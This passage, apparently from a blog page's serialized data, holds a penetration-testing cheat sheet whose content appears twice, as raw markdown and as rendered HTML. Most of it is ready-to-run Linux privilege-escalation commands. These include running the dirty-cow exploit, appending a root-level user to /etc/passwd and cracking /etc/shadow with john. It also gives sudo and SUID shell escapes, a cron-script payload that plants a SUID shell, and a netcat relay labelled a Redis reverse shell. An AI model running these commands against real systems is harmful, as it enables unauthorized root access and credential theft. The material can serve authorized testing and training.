/etc/passwd\n```\nThen login in user hacker\n\nIf /etc/shadow can be read by common user.\n```\nunshadow /etc/passwd /etc/shadow &gt; shadow.txt\nchmod 777 shadow.txt\njohn --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt\n```\n### Password reuse\n### Sudo abuse\n`sudo -l`\n&gt;https://gtfobins.github.io/\n\nFor example:`su,    awk,    man `\n```\nsudo su\n```\n```\nsudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;\n```\n```\nsudo man man\n!/bin/sh\n```\n```\nsudo vim -c &#39;:!/bin/sh&#39;\n```\n### &#39;su root&#39; prohibited\n```\npython -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)\nsudo su\n```\n### Scheduled task\n```\nls -l /etc/cron*\ncat /etc/crontab\n```\nIf there is a scheduled task named 1.py\n```\nls -al /tmp/1.py    //查看是否有w权限\n```\nWrite the code into 1.py\n```\nimport os \nos.system(&#39;cp /bin/sh /tmp/sh&#39;) \nos.system(&#39;chmod u+s /tmp/sh&#39;)\n```\n`./tmp/sh`\n### SUID\nTake nmap as an example:\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n### Environment variable hijacking\nFind command with suid just as 4.1.7.\nSuppose it is `su`\n```\nvim /tmp/su         //write shellcode into su\nexport PATH=/tmp:$PATH\n```\n### Administrator configuration error\nConfiguring a program with SUID that does not have the setuid(0) code, such as `find `mentioned above.\n```\nmkdir abc\nfind abc -exec &#39;/bin/sh&#39; \\;\n```\n### Docker group\n### Service vulnerability\n```\nnetstat -antup\n```\nRedis reverse shell.\n```\nnc -l 12345 | nc 102.168.191.170 80\n```\n## Windows\n***\n# 5 Domain penetration&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Mandatory manual.md&quot;],&quot;digest&quot;:[0,&quot;9a10681b2f297e3d&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;port-scan\&quot;&gt;Port scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#port-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;web-scan\&quot;&gt;Web scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#web-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto  -port 80 -host 192.168.124.44 -o nikto-result.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;vulnerability-analysis\&quot;&gt;Vulnerability analysis&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#vulnerability-analysis\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Use nc to view banner.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv 192.168.124.44 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -m 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;exploitation\&quot;&gt;Exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploitation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;smb\&quot;&gt;smb&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#smb\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux 192.168.124.40&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;smbclient -L 192.168.124.40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;linux\&quot;&gt;Linux&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#linux\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;kernel-stack-overflow\&quot;&gt;Kernel stack overflow&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kernel-stack-overflow\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/*-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit linux 3.10 CentOS Linux 7&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;use tools&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./linux-exploit-suggester-2.pl&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Take the rights of dirty-cow as an example&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -pthread dirty.c -lcrypt -o dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod +x dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./dirty fly&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;plain-password-of-root\&quot;&gt;Plain password of root&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#plain-password-of-root\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;If /etc/passwd can be write by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl passwd -1 -salt hacker 123456&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;generate &lt;code&gt;$1$hacker$4o50Z4aoUGaLMC0Rg4Io40&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;echo &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then login in user hacker&lt;/p&gt;\n&lt;p&gt;If /etc/shadow can be read by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow /etc/passwd /etc/shadow &gt; shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod 777 shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;password-reuse\&quot;&gt;Password reuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#password-reuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;sudo-abuse\&quot;&gt;Sudo abuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#sudo-abuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;https://gtfobins.github.io/\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;GTFOBins - gtfobins.github.io\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;gtfobins.github.io&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;GTFOBins&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;https://gtfobins.github.io/&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div class=\&quot;bg-muted relative md:w-full shrink-0 aspect-1200/630 h-38\&quot;&gt;&lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;GTFOBins\&quot; class=\&quot;h-full w-full object-cover\&quot; loading=\&quot;lazy\&quot;&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;For example:&lt;code&gt;su,    awk,    man &lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo man man&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo vim -c &#39;:!/bin/sh&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;su-root-prohibited\&quot;&gt;’su root’ prohibited&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#su-root-prohibited\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;scheduled-task\&quot;&gt;Scheduled task&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#scheduled-task\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -l /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/crontab&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;If there is a scheduled task named 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /tmp/1.py    //查看是否有w权限&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Write the code into 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;import os &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;cp /bin/sh /tmp/sh&#39;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;chmod u+s /tmp/sh&#39;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;code&gt;./tmp/sh&lt;/code&gt;&lt;/p&gt;\n&lt;h3 id=\&quot;suid\&quot;&gt;SUID&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#suid\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Take nmap as an example:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;environment-variable-hijacking\&quot;&gt;Environment variable hijacking&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#environment-variable-hijacking\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Find command with suid just as 4.1.7.\nSuppose it is &lt;code&gt;su&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;vim /tmp/su         //write shellcode into su&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;administrator-configuration-error\&quot;&gt;Administrator configuration error&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#administrator-configuration-error\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Configuring a program with SUID that does not have the setuid(0) code, such as &lt;code&gt;find &lt;/code&gt;mentioned above.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;mkdir abc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find abc -exec &#39;/bin/sh&#39; \\;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;docker-group\&quot;&gt;Docker group&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#docker-group\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;service-vulnerability\&quot;&gt;Service vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#service-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antup&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Redis reverse shell.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -l 12345 | nc 102.168.191.170 80&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;windows\&quot;&gt;Windows&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#windows\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;5-domain-penetration\&quot;&gt;5 Domain penetration&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#5-domain-penetration\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;port-scan&quot;],&quot;text&quot;:[0,&quot;Port scan&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;web-scan&quot;],&quot;text&quot;:[0,&quot;Web scan&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;vulnerability-analysis&quot;],&quot;text&quot;:[0,&quot;Vulnerability analysis&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;exploitation&quot;],&quot;text&quot;:[0,&quot;Exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;smb&quot;],&quot;text&quot;:[0,&quot;smb&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;kernel-stack-overflow&quot;],&quot;text&quot;:[0,&quot;Kernel stack overflow&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;plain-password-of-root&quot;],&quot;text&quot;:[0,&quot;Plain password of root&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;password-reuse&quot;],&quot;text&quot;:[0,&quot;Password reuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;sudo-abuse&quot;],&quot;text&quot;:[0,&quot;Sudo abuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;su-root-prohibited&quot;],&quot;text&quot;:[0,&quot;’su root’ prohibited&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;scheduled-task&quot;],&quot;text&quot;:[0,&quot;Scheduled task&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;suid&quot;],&quot;text&quot;:[0,&quot;SUID&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;environment-variable-hijacking&quot;],&quot;text&quot;:[0,&quot;Environment variable hijacking&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;administrator-configuration-error&quot;],&quot;text&quot;:[0,&quot;Administrator configuration error&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;docker-group&quot;],&quot;text&quot;:[0,&quot;Docker group&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;service-vulnerability&quot;],&quot;text&quot;:[0,&quot;Service 